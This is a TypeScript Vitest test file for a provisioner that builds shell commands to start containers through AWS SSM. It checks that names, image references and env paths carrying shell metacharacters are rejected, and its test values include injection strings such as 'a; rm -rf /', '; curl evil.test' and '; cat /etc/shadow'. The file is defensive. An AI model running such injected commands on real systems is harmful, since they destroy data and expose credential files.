import { describe, expect, it, vi } from "vitest";

const sent: { commands: string[] }[] = [];

vi.mock("@aws-sdk/client-ssm", () => {
  class SendCommandCommand {
    constructor(readonly input: { Parameters?: { commands?: string[] } }) {}
  }
  class GetCommandInvocationCommand {
    constructor(readonly input: unknown) {}
  }
  class SSMClient {
    async send(command: unknown) {
      if (command instanceof SendCommandCommand) {
        sent.push({ commands: command.input.Parameters?.commands ?? [] });
        return { Command: { CommandId: "cmd-1" } };
      }
      return { Status: "Success", StandardOutputContent: "sha256:abc true\n" };
    }
  }
  return { SSMClient, SendCommandCommand, GetCommandInvocationCommand };
});

const { createSsmProvisioner } = await import("@/infrastructure/mcp/ssmProvisioner");

const REGISTRY = "396608815058.dkr.ecr.ap-northeast-2.amazonaws.com";
const provisioner = createSsmProvisioner({
  instanceId: "i-1",
  region: "ap-northeast-2",
  registry: REGISTRY,
  networkContainer: "agent-studio",
});

/**
 * This adapter assembles a shell command. Everything it accepts is checked
 * before it gets there, because a managed server is created by an operator and
 * "an operator cannot run code on the host" has to be true of the string, not
 * just of the intent.
 */
describe("ssm provisioner input handling", () => {
  it("joins this app's network namespace instead of publishing a port", async () => {
    sent.length = 0;
    const workload = await provisioner.start({
      name: "image-fetch",
      image: `${REGISTRY}/mcp-image-fetch:v1.0.1`,
      containerPort: 3000,
    });

    expect(workload.address).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
    const script = sent[0]?.commands.join("\n") ?? "";
    // Joins this app's namespace rather than publishing a port: every container
    // has its own 127.0.0.1, so a published host port would be unreachable from
    // here — and an unpublished one is reachable from nowhere else.
    const runLine = script.split("\n").find((line) => line.startsWith("docker run")) ?? "";
    expect(runLine).toContain("--network container:agent-studio");
    // no port publishing at all — not to the host, not to any interface
    expect(runLine).not.toMatch(/-p \S+:\S+/);
    expect(runLine).toContain("--memory 512m");
  });

  it("refuses a name or image carrying shell metacharacters", async () => {
    for (const name of ["a; rm -rf /", "a$(id)", "a`id`", "a b", "../escape", "A_B"]) {
      await expect(
        provisioner.start({ name, image: `${REGISTRY}/x:v1`, containerPort: 3000 }),
      ).rejects.toThrow(/unsafe/);
    }
    for (const image of [
      `${REGISTRY}/x:v1; curl evil.test`,
      `${REGISTRY}/x:v1 && id`,
      `${REGISTRY}/x:$(id)`,
      "x:v1|tee",
    ]) {
      await expect(
        provisioner.start({ name: "ok", image, containerPort: 3000 }),
      ).rejects.toThrow(/unsafe|outside/);
    }
  });

  it("refuses an image from outside the configured registry", async () => {
    // An approved artifact means one this account publishes, not any string
    // that parses as an image reference.
    await expect(
      provisioner.start({ name: "ok", image: "docker.io/library/nginx:latest", containerPort: 3000 }),
    ).rejects.toThrow(/outside/);
  });

  it("refuses an env reference that is not a parameter path", async () => {
    await expect(
      provisioner.start({
        name: "ok",
        image: `${REGISTRY}/x:v1`,
        containerPort: 3000,
        envRefs: ["/env/prod/ok; cat /etc/shadow"],
      }),
    ).rejects.toThrow(/unsafe/);
  });

  it("derives the same port for a name every time", async () => {
    // Re-discovery after a restart depends on this: the port is not stored, so
    // it has to be recomputable from the name alone.
    const a = await provisioner.inspect("image-fetch");
    const b = await provisioner.inspect("image-fetch");
    expect(a?.address).toBe(b?.address);
  });
});
